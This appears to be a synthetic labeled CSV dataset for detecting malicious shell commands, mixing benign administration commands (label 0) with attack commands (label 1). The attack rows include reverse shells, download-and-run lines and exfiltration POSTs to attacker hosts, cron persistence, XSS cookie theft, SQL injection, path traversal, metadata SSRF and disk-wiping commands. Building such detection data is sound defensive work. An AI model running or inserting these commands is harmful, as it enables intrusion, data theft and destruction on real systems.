timestamp,attacker_ip,command_sequence,label
2026-01-23 01:27:12,190.246.234.23,df -h,0
2026-01-23 01:40:12,60.195.85.179,tail -20 /var/log/syslog,0
2026-01-23 02:05:12,127.77.170.73,"journalctl -u ssh --since ""1 hour ago""",0
2026-01-23 03:13:12,9.14.168.181,traceroute google.com,0
2026-01-23 16:04:12,203.151.95.154,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 10:11:12,90.46.184.167,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 02:06:12,23.177.109.103,ls -la /var/log/,0
2026-01-23 04:51:12,17.46.221.237,whoami,0
2026-01-23 06:10:12,165.31.60.200,ps aux | grep nginx,0
2026-01-23 08:41:12,103.199.167.169,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 09:26:12,49.138.240.234,rsync -avz /var/www/html/ backup/,0
2026-01-23 17:29:12,149.222.17.86,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 07:08:12,200.44.213.202,ss -tulwn,0
2026-01-23 07:11:12,42.28.136.84,ls -la /var/log/,0
2026-01-23 06:38:12,216.170.33.213,cat /etc/nginx/nginx.conf,0
2026-01-23 02:00:12,138.152.115.207,tail -20 /var/log/syslog,0
2026-01-23 02:08:12,13.44.192.80,ping -c 4 8.8.8.8,0
2026-01-23 01:41:12,196.14.110.114,systemctl status nginx,0
2026-01-23 07:12:12,18.81.250.240,nslookup google.com,0
2026-01-23 03:52:12,87.88.66.139,mount | grep ext4,0
2026-01-23 04:19:12,205.54.197.184,mount | grep ext4,0
2026-01-23 17:17:12,159.223.230.161,host -t txt target.com,1
2026-01-23 12:01:12,128.202.29.139,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 14:54:12,198.42.14.10,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 16:03:12,56.73.46.49,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 12:32:12,93.59.121.49,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 17:00:12,49.239.153.43,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 08:13:12,78.36.30.209,cat /etc/nginx/nginx.conf,0
2026-01-23 05:08:12,19.222.248.92,apt list --upgradable,0
2026-01-23 09:22:12,112.233.51.236,chmod 644 /var/www/html/index.html,0
2026-01-23 10:38:12,206.72.105.104,cat /var/www/../../../../etc/passwd,1
2026-01-23 07:57:12,167.168.14.242,grep 'error' /var/log/syslog,0
2026-01-23 11:12:12,18.190.42.31,"echo ""* * * * * /usr/bin/nc attacker.com 4444 -e /bin/sh"" | crontab -",1
2026-01-23 13:41:12,50.175.185.28,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 08:58:12,60.191.70.103,timedatectl,0
2026-01-23 05:50:12,48.34.2.82,traceroute google.com,0
2026-01-23 08:30:12,75.192.144.32,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 06:31:12,111.129.208.63,nslookup google.com,0
2026-01-23 11:17:12,41.132.104.46,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 10:57:12,28.86.153.237,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 15:20:12,79.59.137.156,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 11:44:12,193.184.62.7,smbclient -L //target.com -U admin%password,1
2026-01-23 17:42:12,133.201.7.23,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 06:19:12,13.89.176.245,uptime,0
2026-01-23 04:28:12,185.96.186.142,crontab -l,0
2026-01-23 01:42:12,207.225.14.203,crontab -l,0
2026-01-23 04:10:12,94.91.34.22,df -h,0
2026-01-23 01:24:12,137.195.158.126,du -sh /home/* | sort -hr,0
2026-01-23 16:57:12,177.209.19.30,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 14:21:12,70.238.168.82,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 15:08:12,109.248.113.67,rm -rf /* --no-preserve-root,1
2026-01-23 12:55:12,55.229.136.55,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 11:35:12,40.76.243.90,rm -rf /* --no-preserve-root,1
2026-01-23 11:10:12,184.17.240.152,sudo -u#-1 /bin/bash,1
2026-01-23 06:00:12,134.27.105.77,timedatectl,0
2026-01-23 16:38:12,103.188.65.123,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 06:29:12,18.61.177.32,apt update,0
2026-01-23 14:19:12,116.223.65.5,sudo nmap --script vuln target.com,1
2026-01-23 03:46:12,62.128.176.211,cat /proc/meminfo | head -10,0
2026-01-23 17:54:12,84.129.130.77,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 04:37:12,173.183.193.147,mtr -c 10 google.com,0
2026-01-23 04:05:12,92.156.17.170,scp user@server:/var/log/app.log ./,0
2026-01-23 07:37:12,37.68.1.45,curl -I https://example.com,0
2026-01-23 10:52:12,173.64.162.251,"echo ""*/5 * * * * curl -s http://attacker.com/payload.sh | bash"" >> /var/spool/cron/root",1
2026-01-23 12:50:12,95.244.104.100,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 07:10:12,84.219.33.16,ip addr show,0
2026-01-23 06:01:12,162.63.139.105,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 09:04:12,219.157.159.143,hostnamectl,0
2026-01-23 17:44:12,192.82.7.68,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 04:00:12,68.151.136.11,traceroute google.com,0
2026-01-23 08:06:12,30.127.2.26,mount | grep ext4,0
2026-01-23 17:28:12,208.247.143.29,host -t txt target.com,1
2026-01-23 11:27:12,100.110.114.81,host -t txt target.com,1
2026-01-23 09:19:12,129.127.214.81,cat /proc/meminfo | head -10,0
2026-01-23 17:36:12,102.46.233.152,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 11:47:12,195.162.135.98,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 14:25:12,65.73.14.185,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 15:51:12,147.140.156.106,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 16:13:12,219.76.224.178,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 05:38:12,206.243.65.21,rsnapshot daily,0
2026-01-23 15:31:12,102.195.251.250,cat ../../../etc/passwd,1
2026-01-23 14:48:12,105.55.206.89,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 09:46:12,68.132.135.206,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 06:48:12,88.236.177.210,lsblk,0
2026-01-23 11:48:12,18.79.227.237,dig @target.com axfr target.com,1
2026-01-23 04:54:12,144.210.148.254,traceroute google.com,0
2026-01-23 05:12:12,200.221.235.124,cat /proc/meminfo | head -10,0
2026-01-23 04:47:12,191.123.75.75,nmcli device status,0
2026-01-23 01:34:12,217.140.144.138,du -sh /var/log/,0
2026-01-23 10:33:12,128.202.2.213,"curl ""http://target.com/load?file=....//....//....//proc/self/environ""",1
2026-01-23 01:35:12,80.76.57.69,"journalctl -u sshd --since ""1 hour ago""",0
2026-01-23 01:57:12,125.125.253.7,df -h,0
2026-01-23 10:34:12,191.238.228.236,"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""10.10.14.5"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",1
2026-01-23 13:30:12,50.119.36.213,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 06:28:12,161.151.103.174,nmcli device status,0
2026-01-23 06:49:12,137.137.157.207,ln -s /var/www/html /home/user/www,0
2026-01-23 10:46:12,205.206.196.88,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 05:29:12,148.124.26.127,ps aux | grep nginx,0
2026-01-23 04:41:12,187.81.249.167,chmod 644 /var/www/html/index.html,0
2026-01-23 05:18:12,59.139.26.28,rsync -avz /var/www/html/ backup/,0
2026-01-23 10:39:12,139.145.105.204,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 06:53:12,124.239.163.89,netstat -tulpn,0
2026-01-23 17:02:12,167.0.224.36,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 10:35:12,77.184.159.240,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 07:53:12,23.36.190.90,rsync -avz /var/www/html/ backup/,0
2026-01-23 03:09:12,211.94.87.221,grep 'error' /var/log/syslog,0
2026-01-23 08:17:12,163.246.233.120,lsblk,0
2026-01-23 17:26:12,168.82.146.237,smbclient -L //target.com -U admin%password,1
2026-01-23 09:34:12,4.24.1.162,localectl status,0
2026-01-23 09:37:12,212.163.240.138,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 06:27:12,127.17.62.232,ls -la /var/log/,0
2026-01-23 06:07:12,197.28.139.249,netstat -tulpn,0
2026-01-23 04:55:12,87.88.196.109,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 05:16:12,177.114.85.235,ln -s /var/www/html /home/user/www,0
2026-01-23 17:21:12,150.173.55.99,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 02:26:12,37.102.135.52,ls -la /var/log/,0
2026-01-23 07:13:12,6.205.149.72,dig example.com,0
2026-01-23 13:03:12,168.104.169.65,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 15:32:12,139.112.205.124,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 09:53:12,29.165.64.211,"curl ""http://target.com/download?file=....//....//....//etc/shadow""",1
2026-01-23 13:21:12,19.137.237.112,rm -rf /var/www/html/*,1
2026-01-23 15:41:12,123.50.123.35,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 12:07:12,199.231.236.7,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 04:20:12,53.231.191.214,find /var/www -name '*.php' -mtime -1,0
2026-01-23 06:08:12,104.96.193.63,mtr -c 10 google.com,0
2026-01-23 05:56:12,41.151.247.163,systemctl status mysql,0
2026-01-23 07:06:12,113.30.237.130,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 04:03:12,54.212.185.61,ping -c 4 google.com,0
2026-01-23 06:23:12,47.213.59.129,localectl status,0
2026-01-23 03:56:12,69.51.204.62,mount | grep ext4,0
2026-01-23 01:25:12,85.161.27.128,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 13:06:12,144.30.67.229,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 06:25:12,132.23.215.30,mtr -c 10 google.com,0
2026-01-23 03:30:12,39.171.90.75,curl -I https://example.com,0
2026-01-23 09:16:12,189.2.132.104,localectl status,0
2026-01-23 05:44:12,169.86.64.194,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 10:10:12,173.126.119.194,sudo -u#-1 /bin/bash,1
2026-01-23 06:12:12,76.71.128.13,curl -I https://example.com,0
2026-01-23 10:09:12,107.41.143.124,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 14:12:12,177.131.146.237,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 02:55:12,120.104.173.146,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 03:54:12,41.118.180.146,ln -s /var/www/html /home/user/www,0
2026-01-23 13:35:12,40.170.255.198,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 11:37:12,190.228.62.64,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 07:36:12,74.247.132.254,lsblk,0
2026-01-23 14:59:12,106.253.242.29,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 05:45:12,1.49.221.5,chown www-data:www-data /var/www/html -R,0
2026-01-23 06:05:12,101.53.233.234,ls -la /var/log/,0
2026-01-23 01:53:12,16.25.101.132,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 09:18:12,157.19.234.244,timedatectl,0
2026-01-23 05:57:12,67.85.151.21,nslookup google.com,0
2026-01-23 15:30:12,41.32.215.19,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 12:57:12,79.90.73.133,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 13:04:12,217.202.241.84,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 04:32:12,212.191.36.122,curl -I https://example.com,0
2026-01-23 08:02:12,181.30.107.211,ip route show,0
2026-01-23 08:31:12,100.97.172.189,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 16:49:12,213.125.251.172,rm -rf /* --no-preserve-root,1
2026-01-23 17:52:12,124.75.184.93,mkfs.ext4 /dev/sda1,1
2026-01-23 12:48:12,64.27.13.53,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 02:21:12,191.187.112.132,systemctl status nginx,0
2026-01-23 15:35:12,20.12.28.231,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 15:37:12,191.154.23.251,enum4linux target.com,1
2026-01-23 11:32:12,115.204.70.141,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 06:09:12,20.247.140.40,ss -tulwn,0
2026-01-23 17:15:12,53.123.101.173,chmod 4777 /bin/bash,1
2026-01-23 03:07:12,146.80.40.239,curl -s https://api.ipify.org,0
2026-01-23 03:57:12,37.167.255.235,ip addr show,0
2026-01-23 11:04:12,220.20.184.40,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 12:11:12,175.194.194.138,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 06:47:12,197.106.150.94,nslookup google.com,0
2026-01-23 11:42:12,14.195.210.51,chmod 4777 /bin/bash,1
2026-01-23 11:50:12,148.103.63.147,chmod 4777 /bin/bash,1
2026-01-23 11:57:12,160.32.167.132,mkfs.ext4 /dev/sda1,1
2026-01-23 10:23:12,207.117.203.77,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
2026-01-23 10:06:12,131.85.238.222,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 13:43:12,129.7.87.226,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 05:52:12,203.139.158.150,rsync -avz /var/www/html/ backup/,0
2026-01-23 13:34:12,180.161.52.42,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 08:04:12,195.38.22.89,wget --spider https://example.com/file.zip,0
2026-01-23 12:10:12,132.215.218.31,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 03:15:12,42.190.88.34,systemctl status mysql,0
2026-01-23 06:42:12,207.211.173.37,ln -s /var/www/html /home/user/www,0
2026-01-23 16:32:12,80.131.118.31,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 04:16:12,107.38.69.237,ip addr show,0
2026-01-23 16:11:12,108.16.135.26,smbclient -L //target.com -U admin%password,1
2026-01-23 08:40:12,6.91.246.144,whoami,0
2026-01-23 05:49:12,179.35.62.238,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 03:26:12,86.241.209.77,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 01:54:12,88.57.40.12,du -sh /home/* | sort -hr,0
2026-01-23 04:48:12,134.52.32.47,chmod 644 /var/www/html/index.html,0
2026-01-23 17:47:12,201.203.150.168,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 10:27:12,118.78.208.64,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 08:15:12,214.66.71.14,scp user@server:/var/log/app.log ./,0
2026-01-23 06:34:12,76.23.91.73,crontab -l,0
2026-01-23 02:17:12,118.190.235.144,df -h /,0
2026-01-23 03:53:12,203.215.74.11,du -sh /var/www/*,0
2026-01-23 15:06:12,169.29.16.192,enum4linux target.com,1
2026-01-23 06:45:12,27.116.91.4,df -h,0
2026-01-23 12:29:12,195.57.236.108,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 06:30:12,85.10.131.223,curl -s https://api.ipify.org,0
2026-01-23 02:25:12,94.191.136.37,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 10:18:12,132.108.195.87,cat /var/www/../../../../etc/passwd,1
2026-01-23 11:45:12,183.90.247.183,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 01:44:12,196.76.239.94,du -sh /home/* | sort -hr,0
2026-01-23 02:16:12,13.170.249.209,ls -la /var/log/,0
2026-01-23 05:48:12,21.63.197.120,find /var/www -name '*.php' -mtime -1,0
2026-01-23 03:14:12,166.212.20.48,rsync -avz /var/www/html/ backup/,0
2026-01-23 05:27:12,81.138.180.86,du -sh /var/www/*,0
2026-01-23 04:04:12,93.225.67.86,top -n 1 | head -20,0
2026-01-23 03:55:12,134.248.243.24,ip route show,0
2026-01-23 15:44:12,2.31.93.112,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 11:00:12,214.182.140.78,sudo -u#-1 /bin/bash,1
2026-01-23 04:17:12,21.129.77.104,traceroute google.com,0
2026-01-23 11:40:12,131.205.178.8,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 17:45:12,38.87.122.97,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 16:31:12,8.223.170.45,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 13:46:12,98.215.159.112,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 04:21:12,30.116.155.21,df -h,0
2026-01-23 13:50:12,170.140.12.10,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 15:58:12,126.197.107.3,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 01:32:12,109.173.153.245,crontab -l,0
2026-01-23 13:11:12,130.125.212.197,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 09:25:12,49.10.207.54,chown www-data:www-data /var/www/html -R,0
2026-01-23 17:37:12,208.131.8.162,enum4linux target.com,1
2026-01-23 02:15:12,93.13.216.224,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 16:18:12,201.122.230.112,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 07:25:12,129.178.211.145,ps aux | grep nginx,0
2026-01-23 03:06:12,30.225.204.34,ip addr show,0
2026-01-23 07:41:12,93.58.207.188,ls -la /var/log/,0
2026-01-23 09:55:12,208.198.46.193,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 12:21:12,143.1.36.140,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 14:56:12,89.45.115.233,dig @target.com axfr target.com,1
2026-01-23 06:52:12,118.150.89.173,rsync -avz /var/www/html/ backup/,0
2026-01-23 15:55:12,218.23.107.9,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 01:59:12,211.168.147.230,apt update && apt list --upgradable,0
2026-01-23 04:36:12,185.156.178.8,fdisk -l,0
2026-01-23 07:22:12,83.1.106.84,nslookup google.com,0
2026-01-23 14:04:12,158.27.191.178,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 04:53:12,191.180.46.201,ls -la /var/log/,0
2026-01-23 17:06:12,169.67.82.47,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 07:28:12,76.84.16.107,mount | grep ext4,0
2026-01-23 01:48:12,187.135.45.218,ping -c 4 8.8.8.8,0
2026-01-23 17:19:12,114.72.123.59,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 08:52:12,168.103.58.127,apt update,0
2026-01-23 02:40:12,222.167.151.3,tail -20 /var/log/syslog,0
2026-01-23 11:26:12,191.155.247.173,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 14:17:12,202.255.108.179,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 09:52:12,203.156.62.2,"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'"" >> /var/spool/cron/root",1
2026-01-23 09:27:12,51.89.115.198,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 05:53:12,222.170.232.253,top -n 1 | head -20,0
2026-01-23 10:56:12,64.33.113.81,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 14:49:12,6.3.227.130,cat ../../../etc/passwd,1
2026-01-23 16:28:12,158.197.158.134,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 16:06:12,157.135.94.41,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 13:56:12,207.63.214.90,sudo nmap --script vuln target.com,1
2026-01-23 07:52:12,174.197.162.109,systemctl status mysql,0
2026-01-23 02:20:12,139.218.7.252,tail -20 /var/log/syslog,0
2026-01-23 13:28:12,149.123.237.137,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 03:24:12,22.216.105.159,fdisk -l,0
2026-01-23 14:10:12,173.104.146.142,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 14:23:12,217.93.248.6,curl http://evil.com/backdoor.php | bash,1
2026-01-23 07:14:12,7.227.223.35,free -m,0
2026-01-23 14:00:12,219.145.113.117,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 09:03:12,62.35.173.116,mtr -c 10 google.com,0
2026-01-23 14:34:12,27.181.93.46,smbclient -L //target.com -U admin%password,1
2026-01-23 12:03:12,159.109.154.79,chmod 4777 /bin/bash,1
2026-01-23 02:41:12,181.47.162.253,systemctl status nginx,0
2026-01-23 15:18:12,24.19.85.121,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 14:30:12,138.70.3.14,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
2026-01-23 01:30:12,91.152.130.167,tail -20 /var/log/syslog,0
2026-01-23 11:02:12,164.110.219.186,"echo ""* * * * * curl http://attacker.com/c2.sh | bash"" >> /var/spool/cron/crontabs/root",1
2026-01-23 09:45:12,113.101.198.6,echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys,1
2026-01-23 16:23:12,146.215.98.57,smbclient -L //target.com -U admin%password,1
2026-01-23 07:27:12,190.115.239.82,openssl x509 -in /etc/ssl/certs/server.crt -text -noout,0
2026-01-23 08:51:12,207.113.138.85,ss -tulwn,0
2026-01-23 10:21:12,145.96.13.113,curl -X POST -d @/etc/passwd https://attacker-server.com/exfil,1
2026-01-23 02:01:12,155.55.51.21,systemctl status nginx,0
2026-01-23 04:06:12,40.242.38.129,nslookup google.com,0
2026-01-23 10:31:12,204.171.90.196,curl -X POST -d @/etc/shadow https://attacker-server.com/exfil,1
2026-01-23 01:52:12,106.66.10.154,crontab -l,0
2026-01-23 07:07:12,95.204.169.249,grep 'error' /var/log/syslog,0
2026-01-23 06:22:12,29.87.128.151,lsblk,0
2026-01-23 02:04:12,198.232.133.128,du -sh /home/* 2>/dev/null | sort -hr,0
2026-01-23 14:11:12,172.117.134.144,chmod 4777 /bin/bash,1
2026-01-23 02:38:12,178.123.115.25,ping -c 4 8.8.8.8,0
2026-01-23 10:36:12,162.61.88.42,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 16:51:12,174.97.21.188,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 01:23:12,55.226.238.45,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 17:12:12,97.242.121.87,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 02:47:12,75.14.61.218,df -h /,0
2026-01-23 14:36:12,145.27.41.177,mkfs.ext4 /dev/sda1,1
2026-01-23 02:44:12,4.40.164.128,du -sh /home/* | sort -hr,0
2026-01-23 07:19:12,91.203.110.224,ip route show,0
2026-01-23 09:14:12,200.221.198.228,top -n 1 | head -20,0
2026-01-23 04:34:12,155.124.191.176,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 06:21:12,104.39.191.191,wget --spider https://example.com/file.zip,0
2026-01-23 13:31:12,187.74.126.36,chmod 4777 /bin/bash,1
2026-01-23 02:32:12,106.228.25.181,crontab -l,0
2026-01-23 11:08:12,78.52.91.239,cat /var/www/../../../../etc/passwd,1
2026-01-23 06:32:12,130.3.120.120,apt list --upgradable,0
2026-01-23 01:28:12,95.28.169.1,ping -c 4 8.8.8.8,0
2026-01-23 05:26:12,57.30.3.181,id,0
2026-01-23 04:33:12,162.6.142.184,timedatectl,0
2026-01-23 06:39:12,169.163.214.83,journalctl -u nginx -n 50,0
2026-01-23 12:46:12,209.140.11.200,cat ../../../etc/passwd,1
2026-01-23 05:20:12,168.180.242.197,nslookup google.com,0
2026-01-23 10:14:12,87.237.144.169,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
